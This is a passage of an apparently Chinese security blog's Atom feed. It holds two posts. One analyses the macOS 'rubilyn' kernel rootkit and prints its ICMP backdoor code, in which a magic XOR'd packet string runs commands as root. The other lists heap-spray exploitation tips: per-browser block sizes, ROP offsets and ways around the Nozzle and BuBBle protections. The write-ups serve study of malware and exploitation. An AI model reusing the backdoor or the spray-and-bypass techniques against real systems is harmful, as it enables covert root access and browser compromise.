class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;当传给用户的ICMP数据包中包含有以下特定数据时就以root权限执行命令：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/* ICMP backdoor configuration */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; MAGIC_ICMP_TYPE 0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; MAGIC_ICMP_CODE 255 &lt;span class=&quot;comment&quot;&gt;/* xor&#39;d magic word*/&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; MAGIC_ICMP_STR &lt;span class=&quot;string&quot;&gt;&quot;\x27\x10\x3\xb\x46\x8\x1c\x10\x1e&quot;&lt;/span&gt;  &lt;span class=&quot;comment&quot;&gt;// 解密后为“n0mn0mn0m”&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; MAGIC_ICMP_STR_LEN 9&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;ipf_input主要处理传给用户的数据：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; errno_t &lt;span class=&quot;title&quot;&gt;ipf_input&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt;* cookie, mbuf_t *data, &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; offset, u_int8_t protocol)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; buf[IP_BUF_SIZE];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; icmp *icmp;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (!(data &amp;amp;&amp;amp; *data))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		return &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (protocol != IPPROTO_ICMP)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		return &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    mbuf_copydata(*data, offset, IP_BUF_SIZE, buf);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    icmp = (struct icmp *)&amp;amp;buf;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// 检测接收的icmp数据包中是否包含后门的特征数据，若是则调用KUNCExecute函数执行命令&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(icmp-&amp;gt;icmp_type==MAGIC_ICMP_TYPE&amp;amp;&amp;amp;icmp-&amp;gt;icmp_code== MAGIC_ICMP_CODE &amp;amp;&amp;amp; &lt;span class=&quot;built_in&quot;&gt;strncmp&lt;/span&gt;(icmp-&amp;gt;icmp_data, icmpstr, MAGIC_ICMP_STR_LEN)==&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        my_KUNCExecute((char*)&amp;amp;k_cmd, kOpenAppAsRoot, kOpenApplicationPath);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    return &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;rubilyn还有个命令行控制台rubilyncon，通过输入参数选项来执行上面某项功能，主要都是通过sysctl控制内核变量来招待相应函数，这些内核变量都是在rubilyn中用sysctl注册的，通过这些内核变量可从用户层直接与rubilyn内核扩展进行交互来执行恶意操作。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;1、隐藏进程&quot;&gt;&lt;a href=&quot;#1、隐藏进程&quot; class=&quot;headerlink&quot; title=&quot;1、隐藏进程&quot;&gt;&lt;/a&gt;1、隐藏进程&lt;/h3&gt;&lt;p&gt;在mac osx上,每个进程的上下文都保存在proc结构中,而在allproc链表中就保存着所有进程proc
    
    </summary>
    
      <category term="技术分享" scheme="http://riusksk.github.io/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="OSX" scheme="http://riusksk.github.io/tags/OSX/"/>
    
      <category term="rootkit" scheme="http://riusksk.github.io/tags/rootkit/"/>
    
  </entry>
  
  <entry>
    <title>Heap Spray 技术要点</title>
    <link href="http://riusksk.github.io/2012/10/09/Heap-Spray-%E6%8A%80%E6%9C%AF%E8%A6%81%E7%82%B9/"/>
    <id>http://riusksk.github.io/2012/10/09/Heap-Spray-技术要点/</id>
    <published>2012-10-08T16:00:00.000Z</published>
    <updated>2016-06-24T14:30:27.000Z</updated>
    
    <content type="html">&lt;p&gt;1、堆喷射堆块大小 ≈ 程序堆块分配大小，以减小堆空隙大小。&lt;/p&gt;
&lt;p&gt;2、不能使用堆缓存块，否则可能破坏地址的可预测性，可通过申请6块相应大小的堆块来清空缓存。&lt;/p&gt;
&lt;p&gt;3、精确定位ROP地址，目标地址如&lt;code&gt;0x0c0c0c0c&lt;/code&gt;至堆块数据起始地址的&lt;code&gt;offset = ( 0x0c0c0c0c - UserPtr（堆数据起始地址）)/2，IE7：0x5FA，IE8：0x5F4/0x5F6，IE9：0x5FC/0x5FE，Firefox9：0x606&lt;/code&gt;，可能不同语言版本会存在偏差。&lt;/p&gt;
&lt;p&gt;4、不同系统、不同浏览器版本喷射块大小：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;XP SP3 – IE7    block = shellcode.substring(2,0x10000-0×21);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;XP SP3 – IE8    block = shellcode.substring(2, 0x40000-0×21);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Vista SP2 – IE7  block = shellcode.substring(0, (0x40000-6)/2);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Vista SP2 – IE8  block = shellcode.substring(0, (0x40000-6)/2);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Win7 – IE8    block = shellcode.substring(0, (0x80000-6)/2);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Vista/Win7 – IE9  block = shellcode.substring(0, (0x40000-6)/2);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;XP SP3/VISTA SP2/WIN7 - Firefox9  block = shellcode.substring(0, (0x40000-6)/2);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;5、&lt;code&gt;Nozzle&lt;/code&gt;保护机制（IE）：检测是否存在重复可转换成汇编代码的字段，若存在则阻止其内存申请。&lt;/p&gt;
&lt;p&gt;6、&lt;code&gt;BuBBle&lt;/code&gt;保护机制（Firefox）：检测JavaScript是否尝试重复申请 &lt;code&gt;NOPs + shellcode (padding + rop chain + shellcode + padding)&lt;/code&gt;的内存块，若发现包含这些字段则阻止其内存申请。&lt;/p&gt;
&lt;p&gt;7、分配 &lt;code&gt;随机数 + rop + shellcode + 随机数&lt;/code&gt; 的堆块，以保证各分配块都是不同的，以此绕过上述保护机制，主要针对IE9。&lt;/p&gt;
&lt;p&gt;8、利用&lt;code&gt;随机变量名 + 随机块&lt;/code&gt;绕过 Firefox9 的保护。&lt;/p&gt;
&lt;p&gt;9、&lt;code&gt;HTML5 Heap Spray&lt;/code&gt;：EUSecWest2012上的演讲主题，通杀Chrome、Firefox、IE9和Safari&lt;br&gt;a、利用&lt;code&gt;canvas&lt;/code&gt;标签定义图形，通过脚本控制每个像素的数据再进行喷射；&lt;br&gt;b、利用&lt;code&gt;Web Worker&lt;/code&gt;的多线程功能，加速堆喷射过程，但IE不支持Worker.&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;1、堆喷射堆块大小 ≈ 程序堆块分配大小，以减小堆空隙大小。&lt;/p&gt;
&lt;p&gt;2、不能使用堆缓存块，否则可能破坏地址的可预测性，可通过申请6块相应大小的堆块来清空缓存。&lt;/p&gt;
&lt;p&gt;3、精确定位ROP地址，目标地址如&lt;code&gt;0x0c0c0c0c&lt;/code&gt;至堆块数据起
    
    </summary>
    
      <category term="技术分享" scheme="http://riusksk.github.io/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="Heap Spray" scheme="http://riusksk.github.io/tags/Heap-Spray/"/>
    
  </entry>
  
</feed>
